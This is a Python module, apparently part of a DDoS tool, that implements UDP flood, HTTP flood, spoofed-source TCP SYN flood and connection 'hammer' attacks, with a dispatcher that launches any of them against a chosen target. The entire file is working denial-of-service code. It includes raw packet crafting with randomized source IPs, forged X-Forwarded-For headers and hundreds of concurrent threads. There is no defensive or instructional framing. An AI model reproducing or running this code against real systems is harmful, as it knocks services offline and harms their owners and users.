# attack_methods.py
import time
import socket
import random
import threading
import ssl
import struct
import requests
from urllib.parse import urlparse
import urllib3
from queue import Queue

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enhanced user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# Thread management
MAX_THREADS = 300
active_threads = threading.Semaphore(MAX_THREADS)

def resolve_target(target):
    """Resolve a target (URL or IP) to IP address and port"""
    try:
        # If it's already an IP:port format
        if ":" in target and not target.startswith("http"):
            parts = target.split(":")
            if len(parts) == 2:
                ip = parts[0]
                port = int(parts[1])
                return ip, port
        
        # Parse URL if it starts with http/https
        if target.startswith("http"):
            parsed = urlparse(target)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            # Resolve hostname to IP
            ip = socket.gethostbyname(hostname)
            return ip, port
        else:
            # Assume it's a domain without scheme
            hostname = target
            port = 80
            ip = socket.gethostbyname(hostname)
            return ip, port
    except Exception as e:
        raise ValueError(f"Could not resolve target: {target} - {str(e)}")

def attack_udp_god(target, duration):
    """Optimized UDP flood that focuses on target"""
    ip, port = resolve_target(target)
    
    # Create a socket that won't affect local network as much
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0)
    
    # Generate payload once to reduce CPU usage
    payload = random._urandom(1400)  # MTU size
    
    end_time = time.time() + duration
    
    # Use a single thread with a tight loop instead of many threads
    packets_sent = 0
    while time.time() < end_time:
        try:
            # Send multiple packets in a burst
            for _ in range(10):
                sock.sendto(payload, (ip, port))
                packets_sent += 1
                
            # Small delay to prevent complete network lock
            time.sleep(0.001)
        except:
            # If there's an error, try to recreate the socket
            try:
                sock.close()
            except:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0)
            time.sleep(0.1)
    
    try:
        sock.close()
    except:
        pass
        
    print(f"UDP attack completed. Sent {packets_sent} packets to {ip}:{port}")

def attack_http_flood(target, duration):
    """More effective HTTP flood"""
    ip, port = resolve_target(target)
    use_ssl = port == 443
    
    # Generate requests once
    requests_list = []
    for _ in range(50):
        method = random.choice(["GET", "POST", "HEAD"])
        path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(5, 15)))
        
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {ip}",
            f"User-Agent: {random.choice(USER_AGENTS)}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "Connection: keep-alive",
        ]
        
        if method == "POST":
            headers.extend([
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {random.randint(100, 2000)}"
            ])
        
        requests_list.append("\r\n".join(headers) + "\r\n\r\n")
    
    end_time = time.time() + duration
    
    def flood():
        with active_threads:
            while time.time() < end_time:
                try:
                    # Create a new socket for each request to avoid connection reuse
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        ssock = context.wrap_socket(sock, server_hostname=ip)
                        ssock.connect((ip, port))
                        ssock.sendall(random.choice(requests_list).encode())
                        ssock.close()
                    else:
                        sock.connect((ip, port))
                        sock.sendall(random.choice(requests_list).encode())
                        sock.close()
                        
                    # Small delay between requests
                    time.sleep(0.01)
                except Exception as e:
                    # On error, just continue
                    try:
                        sock.close()
                    except:
                        pass
                    time.sleep(0.05)
    
    # Start a reasonable number of threads
    threads = []
    for _ in range(50):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for duration
    time.sleep(duration)
    
    # Let threads finish
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def attack_tcp_syn(target, duration):
    """More effective TCP SYN flood"""
    ip, port = resolve_target(target)
    
    # Create raw socket if possible
    try:
        # Try to create a raw socket (requires admin privileges on Windows)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except:
        # Fall back to regular sockets
        sock = None
    
    end_time = time.time() + duration
    
    def syn_flood():
        with active_threads:
            while time.time() < end_time:
                try:
                    if sock:  # Use raw socket if available
                        # Craft TCP SYN packet
                        source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                        source_port = random.randint(1024, 65535)
                        
                        # IP header
                        ip_ver = 4
                        ip_ihl = 5
                        ip_tos = 0
                        ip_tot_len = 40  # IP header + TCP header
                        ip_id = random.randint(1, 65535)
                        ip_frag_off = 0
                        ip_ttl = 255
                        ip_proto = socket.IPPROTO_TCP
                        ip_check = 0
                        ip_saddr = socket.inet_aton(source_ip)
                        ip_daddr = socket.inet_aton(ip)
                        
                        ip_header = struct.pack('!BBHHHBBH4s4s', 
                                              (ip_ver << 4) + ip_ihl,
                                              ip_tos,
                                              ip_tot_len,
                                              ip_id,
                                              ip_frag_off,
                                              ip_ttl,
                                              ip_proto,
                                              ip_check,
                                              ip_saddr,
                                              ip_daddr)
                        
                        # TCP header
                        tcp_source = source_port
                        tcp_dest = port
                        tcp_seq = random.randint(0, 4294967295)
                        tcp_ack_seq = 0
                        tcp_doff = 5
                        tcp_fin = 0
                        tcp_syn = 1
                        tcp_rst = 0
                        tcp_psh = 0
                        tcp_ack = 0
                        tcp_urg = 0
                        tcp_window = socket.htons(5840)
                        tcp_check = 0
                        tcp_urg_ptr = 0
                        
                        tcp_offset_res = (tcp_doff << 4)
                        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
                        
                        tcp_header = struct.pack('!HHLLBBHHH', 
                                               tcp_source, tcp_dest,
                                               tcp_seq, tcp_ack_seq,
                                               tcp_offset_res, tcp_flags,
                                               tcp_window, tcp_check, tcp_urg_ptr)
                        
                        # Pseudo header for checksum
                        source_address = socket.inet_aton(source_ip)
                        dest_address = socket.inet_aton(ip)
                        placeholder = 0
                        protocol = socket.IPPROTO_TCP
                        tcp_length = len(tcp_header)
                        
                        psh = struct.pack('!4s4sBBH', 
                                         source_address, 
                                         dest_address, 
                                         placeholder, 
                                         protocol, 
                                         tcp_length)
                        psh = psh + tcp_header
                        
                        # Calculate checksum
                        tcp_check = checksum(psh)
                        
                        # Repack with correct checksum
                        tcp_header = struct.pack('!HHLLBBHHH', 
                                               tcp_source, tcp_dest,
                                               tcp_seq, tcp_ack_seq,
                                               tcp_offset_res, tcp_flags,
                                               tcp_window, tcp_check, tcp_urg_ptr)
                        
                        # Send packet
                        packet = ip_header + tcp_header
                        sock.sendto(packet, (ip, 0))
                    else:
                        # Fallback to regular socket method
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        try:
                            s.connect((ip, port))
                            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
                            time.sleep(0.01)
                            s.close()
                        except:
                            pass
                        
                    # Small delay
                    time.sleep(0.001)
                except Exception as e:
                    time.sleep(0.01)
    
    # Start threads
    threads = []
    for _ in range(100 if sock else 50):  # More threads if using raw sockets
        t = threading.Thread(target=syn_flood)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    
    # Clean up
    if sock:
        try:
            sock.close()
        except:
            pass
    
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

def checksum(data):
    """Calculate checksum for packets"""
    if len(data) % 2 != 0:
        data += b'\0'
    
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def attack_hammer(target, duration):
    """Simplified but effective hammer attack"""
    ip, port = resolve_target(target)
    
    # Generate request once
    request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\n\r\n".encode()
    
    end_time = time.time() + duration
    
    def hammer():
        with active_threads:
            while time.time() < end_time:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((ip, port))
                    s.send(request)
                    time.sleep(0.1)
                    s.close()
                except:
                    time.sleep(0.1)
    
    # Start threads
    threads = []
    for _ in range(100):
        t = threading.Thread(target=hammer)
        t.daemon = True
        threads.append(t)
        t.start()
    
    time.sleep(duration)
    
    for t in threads:
        try:
            t.join(timeout=1.0)
        except:
            pass

# Attack dispatcher
ATTACK_METHODS = {
    "udp_god": attack_udp_god,
    "http_flood": attack_http_flood,
    "tcp_syn": attack_tcp_syn,
    "hammer": attack_hammer,
}

def launch_attack(method, target, duration):
    """Launch an attack with the specified method"""
    if method in ATTACK_METHODS:
        print(f"Starting {method} attack on {target} for {duration} seconds")
        ATTACK_METHODS[method](target, duration)
        print(f"{method} attack on {target} completed")
    else:
        print(f"Unknown attack method: {method}")
